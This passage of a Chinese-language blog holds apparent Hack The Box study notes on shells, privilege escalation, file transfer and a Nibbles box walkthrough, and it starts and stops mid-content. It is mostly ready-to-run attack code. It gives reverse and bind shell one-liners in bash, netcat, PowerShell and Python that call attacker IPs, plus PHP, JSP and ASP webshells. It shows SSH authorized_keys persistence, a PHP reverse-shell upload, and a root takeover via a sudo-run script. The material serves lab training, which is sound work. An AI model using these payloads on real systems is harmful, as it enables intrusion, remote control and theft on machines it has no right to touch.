class="line">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &gt; <span class="built_in">set</span> RPORT 30715</span><br><span class="line">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &gt; run</span><br><span class="line">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &gt; <span class="built_in">set</span> FILEPATH /flag.txt</span><br><span class="line">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &gt; run</span><br><span class="line">执行后会出现一个文件路径,就是把远程的文件下载到本地了</span><br></pre></td></tr></table></figure>
+<h1 id="Shells"><a href="#Shells" class="headerlink" title="Shells"></a>Shells</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Reverse Shell 反弹</span></span><br><span class="line"><span class="comment"># 先监听一个端口</span></span><br><span class="line">$ nc -lvnp 1234</span><br><span class="line">$ ip a <span class="comment"># 查IP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再在远程机器上执行命令反弹一个shell到监听了一个端口的电脑上</span></span><br><span class="line"><span class="comment"># Reverse Shell Command</span></span><br><span class="line"><span class="comment"># Code: bash</span></span><br><span class="line">bash -c <span class="string">'bash -i &gt;&amp; /dev/TCP/10.10.10.10/1234 0&gt;&amp;1'</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code: powershell</span></span><br><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span class="string">"10.10.10.10"</span>,1234);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (<span class="built_in">pwd</span>).Path + <span class="string">"&gt; "</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------------------</span></span><br><span class="line"><span class="comment"># Bind Shell 正向连接</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Code: python</span></span><br><span class="line">python -c <span class="string">'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code: powershell</span></span><br><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command <span class="variable">$listener</span> = [System.Net.Sockets.TcpListener]1234; <span class="variable">$listener</span>.start();<span class="variable">$client</span> = <span class="variable">$listener</span>.AcceptTcpClient();<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (<span class="built_in">pwd</span>).Path + <span class="string">" "</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接命令 </span></span><br><span class="line">$ nc 10.10.10.1 1234</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级TTY</span></span><br><span class="line"><span class="comment"># nc 连接服务器后操作不是很方便可以用以下方式升级一下tty让操作更加顺</span></span><br><span class="line">$ python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">运行此命令后，我们将ctrl+z后台运行我们的 shell 并返回到我们的本地终端，并输入以下stty命令：</span><br><span class="line">$ ^Z</span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$TERM</span></span><br><span class="line">$ stty size</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows 67 columns 318</span><br><span class="line"></span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line"><span class="comment"># 代码: php</span></span><br><span class="line">&lt;?PHP system(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);?&gt;</span><br><span class="line"><span class="comment"># 代码：jsp</span></span><br><span class="line">&lt;% Runtime.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">"cmd"</span>)); %&gt;</span><br><span class="line"><span class="comment"># 代码：asp</span></span><br><span class="line">&lt;% <span class="built_in">eval</span> request(<span class="string">"cmd"</span>) %&gt;</span><br><span class="line"></span><br><span class="line">网络服务器	默认 Webroot</span><br><span class="line">Apache	/var/www/html/</span><br><span class="line">Nginx	/usr/<span class="built_in">local</span>/nginx/html/</span><br><span class="line">IIS	c:\inetpub\wwwroot\</span><br><span class="line">XAMPP	C:\xampp\htdocs\</span><br><span class="line"></span><br><span class="line">写shell方法: <span class="built_in">echo</span> <span class="string">"&lt;?PHP system(\$_GET['cmd']);?&gt;"</span> &gt; /var/www/html/shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问方法 http://SERVER_IP:PORT/shell.php?cmd=id</span></span><br><span class="line"></span><br><span class="line">另一种选择是使用cURL：</span><br><span class="line">$ curl http://SERVER_IP:PORT/shell.php?cmd=id</span><br></pre></td></tr></table></figure>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考资料</span></span><br><span class="line">https://book.hacktricks.xyz/</span><br><span class="line">linux 提权： https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</span><br><span class="line">windows提权: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</span><br><span class="line"></span><br><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings</span><br><span class="line">linux: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</span><br><span class="line">windows: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举脚本</span></span><br><span class="line">linux: </span><br><span class="line">https://github.com/rebootuser/LinEnum</span><br><span class="line">https://github.com/sleventyeleven/linuxprivchecker</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">https://github.com/GhostPack/Seatbelt</span><br><span class="line">https://github.com/411Hall/JAWS</span><br><span class="line"></span><br><span class="line">用于服务器枚举的另一个有用工具是 Privilege Escalation Awesome Scripts SUITE (PEASS)，因为它维护得很好以保持最新状态，并且包括用于枚举 Linux 和 Windows 的脚本。</span><br><span class="line">https://github.com/carlospolop/PEASS-ng</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 自动linux提权脚本</span></span><br><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kernel Exploits 内核漏洞利用</span></span><br><span class="line"><span class="comment"># Vulnerable Software 易受攻击的软件 dpkg -l 查看已安装的软件</span></span><br><span class="line"><span class="comment"># User Privileges 用户权限</span></span><br><span class="line">Sudo</span><br><span class="line">SUID</span><br><span class="line">Windows Token Privileges</span><br><span class="line">$ sudo -l</span><br><span class="line">$ sudo su -</span><br><span class="line"></span><br><span class="line"><span class="comment"># Scheduled Tasks 计划任务</span></span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exposed Credentials 暴露的凭据 配置文件、日志文件和用户历史文件（Linux 中的 bash_history 和 Windows 中的 PSReadLine）中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH Keys SSH 密钥</span></span><br><span class="line">.ssh directory</span><br><span class="line">/home/user/.ssh/id_rsa or /root/.ssh/id_rsa</span><br><span class="line">比如 得到 id_rsa 文件后可以在本机执行：</span><br><span class="line">$ vim id_rsa</span><br><span class="line">$ chmod 600 id_rsa</span><br><span class="line">$ ssh user@10.10.10.10 -i id_rsa</span><br><span class="line"><span class="comment"># 如果这个文件有写权限, 我们可以将我们的公钥放在用户的 ssh 目录 /home/user/.ssh/authorized_keys 中。</span></span><br><span class="line">$ ssh-keygen -f key</span><br><span class="line">生成后 把pub文件放到远程机器中 $ <span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAB...SNIP...M= user@parrot"</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">用以下命令就能直接登陆了</span><br><span class="line">$ ssh root@10.10.10.10 -i key</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://academy.hackthebox.eu/module/details/51</span></span><br><span class="line"><span class="comment"># https://academy.hackthebox.eu/module/details/67</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.</span></span><br><span class="line">$ sudo -l</span><br><span class="line">可以看到 User user1 may run the following commands on gettingstartedprivesc-261588-68d7c7c946-5m4k5:</span><br><span class="line">    (user2 : user2) NOPASSWD: /bin/bash</span><br><span class="line">$ sudo -u user2 /bin/bash</span><br><span class="line">$ cat ~/flag.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.</span></span><br><span class="line">user2 有访问root目录下的id_rsa的权限</span><br><span class="line">$ cat /etc/ssh/ssh_config 看到本地ssh的端口是80 所以直接连上去就可以了</span><br><span class="line">$ ssh root@127.0.0.1 -p 80 -i /root/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+<h1 id="Transferring-Files"><a href="#Transferring-Files" class="headerlink" title="Transferring Files"></a>Transferring Files</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立文件服务器	</span></span><br><span class="line">$ python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget http://10.10.14.1:8000/linenum.sh</span><br><span class="line">$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using SCP</span></span><br><span class="line">$ scp linenum.sh user@remotehost:/tmp/linenum.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using Base64 例如，如果我们想传输一个名为 shell 的二进制文件，我们可以将它的 base64 编码如下：</span></span><br><span class="line">$ base64 shell -w 0</span><br><span class="line">$ <span class="built_in">echo</span> f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating File Transfers 要验证文件的格式，我们可以在其上运行 file 命令：</span></span><br><span class="line">$ file shell</span><br><span class="line"><span class="comment"># 可以检查它的 md5 哈希值。在我们的机器上，我们可以在其上运行 md5sum：</span></span><br><span class="line">$ md5sum shell</span><br></pre></td></tr></table></figure>
+<h1 id="Starting-Out"><a href="#Starting-Out" class="headerlink" title="Starting Out"></a>Starting Out</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 靶机 </span></span><br><span class="line"><span class="comment"># OWASP Juice Shop是一个用 Node.js、Express 和 Angular 编写的现代易受攻击的 Web 应用程序，它展示了整个 OWASP 前十名以及许多其他实际应用程序安全漏洞。</span></span><br><span class="line">https://owasp.org/www-project-juice-shop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metasploitable 2 是一个故意易受攻击的 Ubuntu Linux VM，可用于练习枚举、自动和手动利用。</span></span><br><span class="line">https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metasploitable 3 是用于构建配置了广泛漏洞的易受攻击的 Windows VM 的模板。</span></span><br><span class="line">https://github.com/rapid7/metasploitable3</span><br><span class="line"></span><br><span class="line"><span class="comment"># DVWA 这是一个易受攻击的 PHP/MySQL Web 应用程序，展示了许多具有不同难度的常见 Web 应用程序漏洞。</span></span><br><span class="line">https://github.com/digininja/DVWA</span><br><span class="line"></span><br><span class="line"><span class="comment">#  YouTube Channels 有许多 YouTube 频道展示了渗透测试/黑客技术。一些值得收藏的有：</span></span><br><span class="line"><span class="comment"># IppSec 提供每个退役 HTB 盒子的极其深入的演练，其中充满了他自己的经验以及有关各种技术的视频。</span></span><br><span class="line">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</span><br><span class="line"><span class="comment"># VbScrub 提供 HTB 视频以及技术视频，主要关注 Active Directory 的利用。</span></span><br><span class="line">https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ</span><br><span class="line"><span class="comment"># STÖK 提供有关各种信息安全相关主题的视频，主要侧重于漏洞赏金和 Web 应用程序渗透测试。</span></span><br><span class="line">https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg</span><br><span class="line"><span class="comment"># LiveOverflow 提供有关各种技术信息安全主题的视频</span></span><br><span class="line">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</span><br><span class="line"></span><br><span class="line"><span class="comment"># Blogs</span></span><br><span class="line"><span class="comment"># 一个值得一看的伟大博客是 0xdf hacks 的东西。</span></span><br><span class="line">https://0xdf.gitlab.io/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tutorial Websites 教程网站</span></span><br><span class="line"><span class="comment"># 有许多教程网站可用于练习基本的 IT 技能，例如脚本编写。</span></span><br><span class="line"><span class="comment"># 这些网站旨在通过“战争游戏”格式的各种场景帮助培训用户分别使用 Windows PowerShell 和 Linux 命令行。</span></span><br><span class="line">https://www.underthewire.tech/index.htm</span><br><span class="line">https://overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTB Starting Point</span></span><br><span class="line">https://www.hackthebox.eu/home/start</span><br><span class="line"><span class="comment"># HTB Tracks</span></span><br><span class="line">https://www.hackthebox.eu/home/tracks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 适合初学者的 HTB 机器</span></span><br><span class="line">https://www.hackthebox.eu/home/machines/profile/1</span><br><span class="line">https://www.hackthebox.eu/home/machines/profile/51</span><br><span class="line">https://www.hackthebox.eu/home/machines/profile/121</span><br><span class="line">https://www.hackthebox.eu/home/machines/profile/108</span><br><span class="line">https://www.hackthebox.eu/home/machines/profile/144</span><br><span class="line"></span><br><span class="line"><span class="comment"># 视频</span></span><br><span class="line"><span class="comment"># https://www.youtube.com/watch?list=PLidcsTyj9JXJfpkDrttTdk1MNT6CDwVZF&amp;v=mC7G3i2gV54</span></span><br><span class="line"><span class="comment"># https://www.youtube.com/watch?list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn&amp;v=-KBm3tBNK74</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTB 平台包含各种类别的一次性挑战。一些适合初学者的挑战包括：</span></span><br><span class="line">https://www.hackthebox.eu/home/challenges/Reversing?name=Find%20The%20Easy%20Pass</span><br><span class="line">https://www.hackthebox.eu/home/challenges/Crypto?name=Weak%20RSA</span><br><span class="line">https://www.hackthebox.eu/home/challenges/Pwn?name=You%20know%200xDiablos</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dante Prolab 是迄今为止提供的最适合初学者的实验室。</span></span><br><span class="line">https://www.hackthebox.eu/home/labs/pro/view/4</span><br></pre></td></tr></table></figure>
+<h1 id="Navigating-HTB"><a href="#Navigating-HTB" class="headerlink" title="Navigating HTB"></a>Navigating HTB</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 您可以在左侧窗格中或通过单击顶部窗格中的用户名来访问您的 HTB 个人资料页面。</span></span><br><span class="line">https://app.hackthebox.eu/profile/overview</span><br><span class="line">https://app.hackthebox.eu/tracks</span><br></pre></td></tr></table></figure>
+<h1 id="Nibbles-Enumeration"><a href="#Nibbles-Enumeration" class="headerlink" title="Nibbles - Enumeration"></a>Nibbles - Enumeration</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">视频	https://www.youtube.com/watch?v=s_0GcRGv6Ds</span><br><span class="line">演练	https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap 查找开放端口</span></span><br><span class="line">$ nmap -sV --open -oA nibbles_initial_scan &lt;ip address&gt;</span><br><span class="line">这将针对默认的前 1,000 个端口运行服务枚举 (-sV) 扫描，并且仅返回打开的端口 (--open)。</span><br><span class="line">我们可以通过使用命令 nmap -v -oG - 在没有指定目标的情况下运行扫描来检查 nmap 针对给定扫描类型扫描哪些端口。</span><br><span class="line">$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.190</span><br><span class="line">$ nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)</span></span><br><span class="line">$ nmap -sC -p 80 -oA nibbles_script_scan 10.129.42.190</span><br><span class="line">2.4.18</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们可以使用 whatweb 来尝试识别正在使用的 Web 应用程序。</span></span><br><span class="line">$ whatweb http://10.129.42.190/nibbleblog</span><br><span class="line"><span class="comment"># Nibbleblog，这是一个使用 PHP 构建的免费博客引擎。</span></span><br><span class="line">https://www.nibbleblog.com/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录枚举</span></span><br><span class="line"><span class="comment"># https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/</span></span><br><span class="line">$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt</span><br><span class="line">$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -</span><br><span class="line"><span class="comment"># Hydra 等工具进行暴力登录</span></span><br><span class="line">$ gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/dirb/wordlists/common.txt</span><br><span class="line">$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -</span><br><span class="line">使用Hashcat等工具进行离线密码破解或尝试猜测密码时，使用 CeWL 等工具抓取网站生成的词表，成功破解密码哈希（例如公司的无线网络密码）的情况并不少见。</span><br><span class="line">https://github.com/digininja/CeWL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell 清单</span></span><br><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</span><br><span class="line">https://highon.coffee/blog/reverse-shell-cheat-sheet/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级tty </span></span><br><span class="line">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</span><br><span class="line">$ python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Nibbles - Privilege Escalation</span></span><br><span class="line"><span class="comment"># 自动提权 </span></span><br><span class="line"><span class="comment"># 上传文件 sudo python3 -m http.server 8080</span></span><br><span class="line">https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Escalate privileges and submit the root.txt flag.</span></span><br><span class="line">gobuster dir -u http://10.129.211.6/ -w /usr/share/dirb/wordlists/common.txt</span><br><span class="line">curl -s http://10.129.211.6/nibbleblog/content/private/users.xml | xmllint --format -</span><br><span class="line">curl -s http://10.129.211.6/nibbleblog/content/private/config.xml | xmllint --format -</span><br><span class="line">http://10.129.211.6/nibbleblog/admin.php</span><br><span class="line">admin / nibbles</span><br><span class="line">http://10.129.211.6/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</span><br><span class="line">http://10.129.211.6/nibbleblog/content/private/plugins/my_image/</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">'id'</span>); ?&gt;</span><br><span class="line">&lt;?php system (<span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.203 8888 &gt;/tmp/f"</span>); ?&gt;</span><br><span class="line">nc -lvnp 8888</span><br><span class="line">curl http://10.129.211.6/nibbleblog/content/private/plugins/my_image/image.php</span><br><span class="line">python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">sudo python3 -m http.server 8000</span><br><span class="line">wget http://10.10.14.203:8000/LinEnum.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.203 8889 &gt;/tmp/f'</span> | tee -a monitor.sh</span><br><span class="line">nc -lvnp 8889</span><br><span class="line">sudo /home/nibbler/personal/stuff/monitor.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spawn the target, gain a foothold and submit the contents of the user.txt flag.</span></span><br><span class="line">nmap -sV --open -oA nibbles_initial_scan 10.129.133.76</span><br></pre></td></tr></table></figure>
